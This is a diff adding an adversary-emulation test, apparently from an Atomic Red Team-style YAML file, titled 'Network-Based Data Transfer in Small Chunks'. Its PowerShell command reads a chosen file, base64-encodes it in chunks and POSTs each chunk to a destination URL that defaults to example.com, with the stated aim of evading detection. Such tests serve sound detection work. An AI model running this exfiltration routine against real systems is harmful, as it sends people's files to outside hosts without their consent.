@@ -31,3 +31,35 @@ atomic_tests:
     cleanup_command: |
       if [ -f #{folder_path}/safe_to_delete ]; then rm -rf #{folder_path}; fi;
     name: sh
+
+- name: Network-Based Data Transfer in Small Chunks
+  auto_generated_guid: f0287b58-f4bc-40f6-87eb-692e126e7f8f
+  description: "Simulate transferring data over a network in small chunks to evade detection."
+  supported_platforms:
+  - "windows"
+  input_arguments:
+    source_file_path:
+      description: "Path to the source file to transfer."
+      type: path
+      default: "[User specified]"
+    destination_url:
+      description: "URL of the destination server."
+      type: url
+      default: "http://example.com"
+    chunk_size:
+      description: "Size of each data chunk (in KB)."
+      type: integer
+      default: 1024
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $file = [System.IO.File]::OpenRead(#{source_file_path})
+      $chunkSize = #{chunk_size} * 1KB
+      $buffer = New-Object Byte[] $chunkSize
+  
+      while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {
+          $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)
+          Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk
+      }
+      $file.Close()
